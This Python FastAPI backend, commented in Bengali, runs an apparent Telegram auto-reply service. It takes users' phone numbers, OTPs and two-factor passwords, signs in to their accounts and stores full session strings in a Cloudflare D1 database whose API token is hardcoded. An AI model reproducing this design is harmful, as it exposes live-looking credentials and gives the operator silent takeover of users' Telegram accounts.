import os
import asyncio
import requests
from fastapi import FastAPI, Request, HTTPException, BackgroundTasks
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import uvicorn

app = FastAPI()

# --- ১. ফ্রন্টএন্ড সেটআপ (HTML & Static Files) ---
# 'frontend' ফোল্ডার থেকে HTML ফাইলগুলো সার্ভ করার জন্য
app.mount("/frontend", StaticFiles(directory="frontend"), name="frontend")
templates = Jinja2Templates(directory="frontend")

# --- ২. পেজ রাউটিং (Browser-এ দেখার জন্য) ---
@app.get("/", response_class=HTMLResponse)
async def read_login(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.get("/verify", response_class=HTMLResponse)
async def read_verify(request: Request):
    return templates.TemplateResponse("verify.html", {"request": request})

@app.get("/home", response_class=HTMLResponse)
async def read_home(request: Request):
    return templates.TemplateResponse("home.html", {"request": request})

# --- ৩. ক্লাউডফ্লেয়ার D1 কনফিগারেশন ---
CF_ACC_ID = "57bdaf73b4ceb569b6de021f12d0ea3d"
CF_DB_ID = "7b646686-5b58-4c36-8a75-6eb62a190150"
CF_TOKEN = "MEWIAo2AAFe6nYf79WsLP0pysthOczmf2iC1HZWq"

pending_clients = {}

class LoginData(BaseModel):
    api_id: str; api_hash: str; phone: str

class VerifyData(BaseModel):
    phone: str; otp: str; password: str = None

def query_d1(sql, params):
    url = f"https://api.cloudflare.com/client/v4/accounts/{CF_ACC_ID}/d1/database/{CF_DB_ID}/query"
    headers = {"Authorization": f"Bearer {CF_TOKEN}", "Content-Type": "application/json"}
    res = requests.post(url, headers=headers, json={"sql": sql, "params": params})
    return res.json()

# --- ৪. অটো-রিপ্লাই বট লজিক ---
async def start_phantom_bot(session_str, api_id, api_hash):
    try:
        client = TelegramClient(StringSession(session_str), int(api_id), api_hash)
        await client.connect()
        
        @client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
        async def handler(event):
            await event.reply("**[Auto Reply]** I am currently offline. Powered by Orange Print.")
        
        await client.run_until_disconnected()
    except Exception as e:
        print(f"Bot Error: {e}")

# --- ৫. API এন্ডপয়েন্ট (বট কানেকশন) ---
@app.post("/send_otp")
async def send_otp(data: LoginData):
    try:
        client = TelegramClient(StringSession(), int(data.api_id), data.api_hash)
        await client.connect()
        sent_code = await client.send_code_request(data.phone)
        pending_clients[data.phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "api_id": data.api_id, 
            "api_hash": data.api_hash
        }
        return {"status": "success"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/verify_code")
async def verify_code(data: VerifyData, background_tasks: BackgroundTasks):
    if data.phone not in pending_clients:
        raise HTTPException(status_code=400, detail="Session Expired")
    
    info = pending_clients[data.phone]
    try:
        await info["client"].sign_in(data.phone, data.otp, password=data.password)
        session_str = info["client"].session.save()
        
        # Save to D1
        query_d1("INSERT INTO users (phone, api_id, api_hash, session_string) VALUES (?, ?, ?, ?) ON CONFLICT(phone) DO UPDATE SET session_string=?", 
                 [data.phone, info["api_id"], info["api_hash"], session_str, session_str])
        
        # ব্যাকগ্রাউন্ডে বট স্টার্ট
        background_tasks.add_task(start_phantom_bot, session_str, info["api_id"], info["api_hash"])
        
        del pending_clients[data.phone]
        return {"status": "success"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
